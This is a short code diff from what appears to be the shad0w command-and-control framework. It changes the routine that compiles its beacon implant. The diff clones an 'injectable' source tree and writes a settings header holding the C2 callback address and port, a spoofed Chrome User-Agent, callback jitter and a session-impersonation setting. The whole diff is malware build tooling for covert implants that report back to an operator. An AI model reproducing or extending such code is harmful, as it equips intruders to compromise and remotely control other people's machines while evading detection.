@@ -66,16 +66,17 @@ async def compile_and_store_static(shad0w):
     os.system(f"cp -r /root/shad0w/beacon/lib/* {lib_dir_name}")
 
     # clone the source files into the temp dir
-    buildtools.clone_source_files(builddir=build_dir_name)
+    buildtools.clone_source_files(rootdir="injectable", builddir=build_dir_name)
 
     # set the settings
     settings_template = """#define _C2_CALLBACK_ADDRESS L"%s"
 #define _C2_CALLBACK_PORT %s
 #define _CALLBACK_USER_AGENT L"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
-#define _CALLBACK_JITTER %s000""" % (shad0w.endpoint, shad0w.addr[1], 1)
+#define _CALLBACK_JITTER %s000
+#define IMPERSONATE_SESSION \"%s\"""" % (shad0w.endpoint, shad0w.addr[1], 1, None)
 
     # write the new settings
-    buildtools.update_settings_file(None, custom_template=settings_template, custom_path=build_dir_name + "/setting.h")
+    buildtools.update_settings_file(None, custom_template=settings_template, custom_path=build_dir_name + "/settings.h")
 
     # do the compile
     buildtools.make_in_clone(arch=arch, platform=platform, secure=secure, static=static, builddir=build_dir_name, modlocation=mod_name)
